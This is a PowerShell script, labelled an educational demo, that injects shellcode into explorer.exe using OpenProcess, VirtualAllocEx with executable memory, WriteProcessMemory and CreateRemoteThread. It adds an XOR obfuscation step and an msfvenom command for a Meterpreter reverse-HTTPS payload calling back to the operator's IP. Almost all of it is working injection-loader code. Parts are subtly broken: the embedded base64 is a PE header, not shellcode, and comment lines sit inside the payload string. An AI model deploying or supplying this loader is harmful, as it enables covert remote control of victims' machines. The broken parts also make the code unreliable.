<#
PowerShell Process Injection Demo (Educational)
.DESCRIPTION
    Injects shellcode into explorer.exe using Win32 APIs.
    Designed for cybersecurity training (use responsibly).
    Author: Abbas d3hack Aghayev
    Lab: Windows 11 (Tested)
#>

# --- Win32 API Definitions (P/Invoke) ---
$Win32Code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    // Open a process with specific access rights
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess, 
        bool bInheritHandle, 
        int dwProcessId
    );

    // Allocate memory in a remote process
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );

    // Write data to remote process memory
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        uint nSize, 
        out uint lpNumberOfBytesWritten
    );

    // Create a remote thread to execute shellcode
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );

    // Close handle to avoid resource leaks
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $Win32Code -Name "Win32API" -Namespace "Interop"

$PROCESS_ALL_ACCESS = 0x001F0FFF  # Full access to the process
$MEM_COMMIT_RESERVE = 0x3000       # MEM_COMMIT | MEM_RESERVE
$PAGE_EXECUTE_READWRITE = 0x40     # RWX permissions

function Invoke-XorDecrypt {
    param(
        [Byte[]]$Data,
        [Byte]$Key
    )
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor $Key
    }
    return $Data
}

# --- Meterpreter Shellcode (Replace with Your Base64 Payload) ---
$Base64Payload = @"
# GENERATE WITH: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f base64
# Example (fake shellcode for demo):
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAiELAQsAAAgAAAAGAAAAAAAAzi4AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACQuAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAADYLQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAJAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAC0LgAAAAAAAEgAAAACAAUAECEAAMQKAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABswAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgATMAQAQwAAAAEAABFzAQAACgp+AQAA
"@

try {
    $TargetProcess = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
    Write-Host "[+] Target PID: $($TargetProcess.Id)"

    $hProcess = [Interop.Win32API]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetProcess.Id)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "OpenProcess failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    $Shellcode = [Convert]::FromBase64String($Base64Payload)
    $XorKey = 0x55
    $EncryptedShellcode = Invoke-XorDecrypt -Data $Shellcode -Key $XorKey

    $AllocatedMemory = [Interop.Win32API]::VirtualAllocEx(
        $hProcess,
        [IntPtr]::Zero,
        [uint32]$EncryptedShellcode.Length,
        $MEM_COMMIT_RESERVE,
        $PAGE_EXECUTE_READWRITE
    )
    if ($AllocatedMemory -eq [IntPtr]::Zero) {
        throw "VirtualAllocEx failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    $BytesWritten = 0
    $Success = [Interop.Win32API]::WriteProcessMemory(
        $hProcess,
        $AllocatedMemory,
        $EncryptedShellcode,
        [uint32]$EncryptedShellcode.Length,
        [ref]$BytesWritten
    )
    if (-not $Success -or $BytesWritten -ne $EncryptedShellcode.Length) {
        throw "WriteProcessMemory failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    $hThread = [Interop.Win32API]::CreateRemoteThread(
        $hProcess,
        [IntPtr]::Zero,
        0,
        $AllocatedMemory,
        [IntPtr]::Zero,
        0,
        [IntPtr]::Zero
    )
    if ($hThread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[+] Shellcode injected successfully!"
}
catch {
    Write-Error "[-] Injection failed: $_"
}
finally {
    if ($hProcess -ne [IntPtr]::Zero) {
        [Interop.Win32API]::CloseHandle($hProcess) | Out-Null
    }
    if ($hThread -ne [IntPtr]::Zero) {
        [Interop.Win32API]::CloseHandle($hThread) | Out-Null
    }
}